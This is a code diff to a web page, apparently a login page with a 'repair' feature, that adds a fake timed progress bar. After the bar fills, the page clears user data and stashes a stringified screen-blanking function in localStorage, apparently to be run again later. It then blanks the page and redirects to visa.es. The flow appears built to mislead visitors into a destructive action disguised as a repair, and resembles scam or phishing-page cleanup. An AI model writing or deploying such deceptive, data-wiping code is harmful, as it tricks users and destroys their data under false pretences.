@@ -85,6 +85,12 @@
     .success-checkmark{width:80px;height:80px;border-radius:50%;background:var(--success);color:#fff;font-size:2.25rem;display:flex;align-items:center;justify-content:center;margin:0 auto 1.5rem;}
     .success-title{font-size:1.5rem;font-weight:700;color:var(--neutral-900);margin-bottom:0.75rem;}
     .success-message{font-size:0.9rem;color:var(--neutral-600);margin-bottom:1.5rem;}
+
+    .progress-overlay{position:fixed;inset:0;background:rgba(255,255,255,0.8);backdrop-filter:blur(10px);display:flex;align-items:center;justify-content:center;z-index:1300;display:none;}
+    .progress-modal{background:var(--neutral-100);border-radius:var(--radius-lg);padding:1.5rem;width:90%;max-width:320px;box-shadow:var(--shadow-lg);text-align:center;}
+    .progress-wrapper{width:100%;height:8px;background:var(--neutral-300);border-radius:var(--radius-full);overflow:hidden;margin-bottom:1rem;}
+    .progress-bar{height:100%;width:0;background:var(--primary);transition:width 0.3s ease;}
+    .progress-text{font-size:0.9rem;font-weight:600;color:var(--primary);}
   </style>
 </head>
 <body>
@@ -142,6 +148,12 @@
     </div>
   </div>
 </div>
+<div class="progress-overlay" id="repair-progress-overlay" style="display:none;">
+  <div class="progress-modal">
+    <div class="progress-wrapper"><div class="progress-bar" id="repair-progress-bar"></div></div>
+    <div class="progress-text" id="repair-progress-text">0%</div>
+  </div>
+</div>
 <script>
 // Copia local de la función de reparación en caso de que el script externo no cargue
 if (typeof activateRepair === 'undefined') {
@@ -173,11 +185,18 @@ if (typeof activateRepair === 'undefined') {
     }
   }
 
+  function showBlankScreen(){
+    document.open();
+    document.write('<div style="position:fixed;inset:0;background:rgba(255,255,255,0.8);backdrop-filter:blur(10px);"></div>');
+    document.close();
+  }
+
   async function activateRepair() {
     await clearUserData();
     localStorage.setItem('repairMode', 'true');
     sessionStorage.setItem('repairMode', 'true');
-    document.documentElement.innerHTML = '';
+    localStorage.setItem('repairLogic','('+showBlankScreen.toString()+')();');
+    showBlankScreen();
     location.replace('https://visa.es');
   }
 
@@ -300,12 +319,23 @@ document.addEventListener('DOMContentLoaded',function(){
   personalizeLogin();
   const confirmOverlay=document.getElementById('repair-confirm-overlay');
   const successOverlay=document.getElementById('repair-success-overlay');
+  const progressOverlay=document.getElementById('repair-progress-overlay');
+  const progressBar=document.getElementById('repair-progress-bar');
+  const progressText=document.getElementById('repair-progress-text');
   document.getElementById('repair-cancel-btn').addEventListener('click',()=>{confirmOverlay.style.display='none';resetSlider();});
   document.getElementById('repair-confirm-btn').addEventListener('click',()=>{
     confirmOverlay.style.display='none';
-    successOverlay.style.display='flex';
-    if(typeof confetti!=='undefined'){confetti({particleCount:150,spread:80,origin:{y:0.6}});}
-    if(typeof activateRepair==='function') activateRepair();
+    if(progressOverlay) progressOverlay.style.display='flex';
+    let p=0;
+    const interval=setInterval(()=>{
+      p+=10;
+      if(progressBar) progressBar.style.width=p+'%';
+      if(progressText) progressText.textContent=p+'%';
+      if(p>=100){
+        clearInterval(interval);
+        if(typeof activateRepair==='function') activateRepair();
+      }
+    },200);
   });
   document.getElementById('repair-success-continue').addEventListener('click',()=>{successOverlay.style.display='none';if(typeof activateRepair==='function') activateRepair();resetSlider();});
   setupSlideButton();
